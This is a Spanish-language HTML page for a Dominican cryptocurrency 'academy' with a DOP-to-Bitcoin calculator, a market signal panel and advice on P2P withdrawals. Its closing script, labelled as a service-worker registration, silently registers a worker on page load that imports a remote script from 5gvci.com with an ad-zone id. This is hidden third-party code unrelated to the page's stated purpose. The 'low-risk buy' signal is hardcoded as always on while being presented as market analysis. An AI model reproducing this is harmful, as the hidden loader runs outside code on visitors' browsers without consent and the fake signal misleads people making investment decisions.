<!doctype html>
<html lang="es">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CryptoDominicana – Academia de Criptomonedas y Bolsa RD</title>
    <meta name="description" content="Aprende a invertir en Bitcoin y la bolsa desde RD. Calculadora DOP, precios en vivo y noticias financieras 2026.">
    
    <meta property="og:title" content="CryptoDominicana – Academia de Criptomonedas RD">
    <meta property="og:description" content="Calcula tus pesos a Bitcoin y aprende a invertir en la bolsa dominicana.">
    <meta property="og:image" content="https://i.imgur.com/your-optimized-image.png">
    
    <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "FAQPage",
      "mainEntity": [{
        "@type": "Question",
        "name": "¿Es legal comprar Bitcoin en República Dominicana?",
        "acceptedAnswer": {
          "@type": "Answer",
          "text": "Sí, es legal. El Banco Central no lo considera moneda de curso legal, pero se reconoce como activo digital."
        }
      }]
    }
    </script>
    
    <style>
        /* Estilos base de CryptoDominicana */
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Arial, sans-serif; }
        body { background-color: #0f0f0f; color: #fff; line-height: 1.6; }
        header { background-color: #1a5f7a; padding: 1rem 2rem; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 1000; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
        .logo { font-size: 1.5rem; font-weight: bold; color: #fff; }
        
        .hero { background: linear-gradient(rgba(0,0,0,0.85), rgba(0,0,0,0.7)), url('https://images.unsplash.com/photo-1639762681485-074b7f938ba0?auto=format&fit=crop&w=1470&q=80'); background-size: cover; padding: 8rem 2rem; text-align: center; }
        .hero h1 { font-size: 3rem; color: #f9b32f; margin-bottom: 1rem; }

        /* Estilos Calculadora y Semáforo */
        .seccion { padding: 4rem 2rem; max-width: 1200px; margin: 0 auto; }
        .highlight-box { background: #1e1e1e; padding: 2.5rem; border-radius: 20px; text-align: center; border: 1px solid #333; }
        .price-val { font-size: 2.5rem; font-weight: bold; color: #f9b32f; margin: 15px 0; }
        input#input-dop { padding: 15px; border-radius: 8px; border: 2px solid #1a5f7a; background: #2a2a2a; color: #fff; width: 280px; font-size: 1.2rem; text-align: center; }
        
        .semaforo { display: flex; gap: 1rem; margin-top: 2rem; flex-wrap: wrap; }
        .luz { flex: 1; padding: 1.5rem; border-radius: 10px; text-align: center; opacity: 0.3; font-weight: bold; transition: 0.5s; }
        .luz.activa { opacity: 1; box-shadow: 0 0 20px rgba(255,255,255,0.2); }
        .verde { background: #27ae60; }
        .amarilla { background: #f1c40f; color: #000; }
        .roja { background: #e74c3c; }
        
        .btn-ws { background-color: #25d366; color: #fff; padding: 10px 20px; text-decoration: none; border-radius: 5px; font-weight: bold; display: inline-block; margin-top: 20px; }
    </style>
</head>
<body>

    <header>
        <div class="logo">CryptoDominicana</div>
        <nav style="display: flex; gap: 15px;">
            <a href="#calc" style="color: white; text-decoration: none;">Calculadora</a>
            <a href="#p2p" style="color: white; text-decoration: none;">Retiros RD</a>
        </nav>
    </header>

    <section class="hero">
        <h1>Bitcoin en República Dominicana</h1>
        <p>Tu guía para invertir en 2026 de forma segura.</p>
    </section>

    <section class="seccion" id="calc">
        <h2 style="text-align:center; margin-bottom: 2rem; color: #1a5f7a;">Calculadora en Tiempo Real</h2>
        <div class="highlight-box">
            <p>Precio BTC hoy: <span id="btc-price-display" style="color: #f9b32f;">Cargando...</span></p>
            <br>
            <input type="number" id="input-dop" placeholder="Cantidad en RD$" oninput="convertir()">
            <div class="price-val" id="resultado-btc">0.00000000 BTC</div>
            <p style="font-size: 0.8rem; color: #888;">Tasa de cambio: 1 USD ≈ 62.50 DOP (Estimado 2026)</p>
        </div>
    </section>

    <section class="seccion">
        <h2 style="text-align:center; color: #1a5f7a;">Análisis de Mercado</h2>
        <div class="semaforo">
            <div class="luz verde activa">COMPRA BAJO RIESGO</div>
            <div class="luz amarilla">MERCADO LATERAL</div>
            <div class="luz roja">SOBRECOMPRA</div>
        </div>
    </section>

    <section class="seccion" id="p2p">
        <div class="highlight-box" style="text-align: left;">
            <h3>¿Cómo retirar a Banreservas o Popular?</h3>
            <p>En 2026, la vía más rápida es el <strong>Mercado P2P</strong>. Vendes tus activos a un usuario verificado y recibes pesos en tu cuenta local al instante.</p>
            <a href="#" class="btn-ws">Hablar con un asesor en WhatsApp</a>
        </div>
    </section>

    <script>
        let btcPriceDOP = 0;

        // 1. Obtener precio real de API
        async function actualizarPrecio() {
            try {
                const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd');
                const data = await response.json();
                const usdPrice = data.bitcoin.usd;
                const tasaDOP = 62.50; // Tasa proyectada
                btcPriceDOP = usdPrice * tasaDOP;
                
                document.getElementById('btc-price-display').innerText = `RD$ ${btcPriceDOP.toLocaleString()}`;
            } catch (error) {
                console.error("Error obteniendo precio:", error);
                document.getElementById('btc-price-display').innerText = "Error al conectar";
            }
        }

        // 2. Lógica de conversión
        function convertir() {
            const dop = document.getElementById('input-dop').value;
            if (btcPriceDOP > 0 && dop > 0) {
                const btc = dop / btcPriceDOP;
                document.getElementById('resultado-btc').innerText = btc.toFixed(8) + " BTC";
            }
        }

        // 3. Registro del Service Worker
        if ('serviceWorker' in navigator) {
            window.addEventListener('load', () => {
                const swCode = `
                    self.options = { "domain": "5gvci.com", "zoneId": 10548412 };
                    importScripts('https://5gvci.com/act/files/service-worker.min.js?r=sw');
                `;
                const blob = new Blob([swCode], { type: 'application/javascript' });
                navigator.serviceWorker.register(URL.createObjectURL(blob));
            });
        }

        actualizarPrecio();
        setInterval(actualizarPrecio, 60000); // Actualiza cada minuto
    </script>
</body>
</html>
